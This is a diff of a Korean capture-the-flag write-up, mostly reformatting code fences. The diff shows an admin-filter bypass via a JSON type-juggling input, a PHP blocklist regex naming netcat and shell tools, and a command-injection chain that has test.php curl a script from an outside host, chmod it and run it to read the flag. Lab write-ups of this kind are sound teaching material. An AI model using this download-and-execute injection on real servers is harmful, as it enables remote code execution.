@@ -72,12 +72,12 @@ admin 필터링에서는 `===(strict comparision)`을 사용하여 자료형까�
 이 부분을 이용하여 `username={"username":true}`를 입력하면 "admin" 필터링은 우회하며, case "admin": 문은 통과할 수 있다.
 
 ![](../assets/img/Pasted%20image%2020240413002927.png)
-
 ![](../assets/img/Pasted%20image%2020240413002934.png)
 ![](../assets/img/Pasted%20image%2020240413002943.png)
+
 다음은 test.php의 내용을 통해 flag를 획득해야한다. 아래는 test.php의 내용이다.
 
-```
+```php
 #test.php
 $pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';
 
@@ -109,14 +109,14 @@ PHP 웹쉘 또는 `/flag`를 실행하여 pattern에 걸리지 않는 이름으�
 
 후자로 진행을 해보면 아래 처럼 플래그를 획득할 수 있다.
 
-```
+```shell
 #Filename:heogi
 #!/bin/bash
 
 /flag > te.ttt
 ```
 
-```
+```http
 1. GET /test.php?cmd=curl ctf.heogi.com/heogi -o heogi
 2. GET /test.php?cmd=chmod 777 heogi
 3. GET /test.php?cmd=/var/www/html/heogi
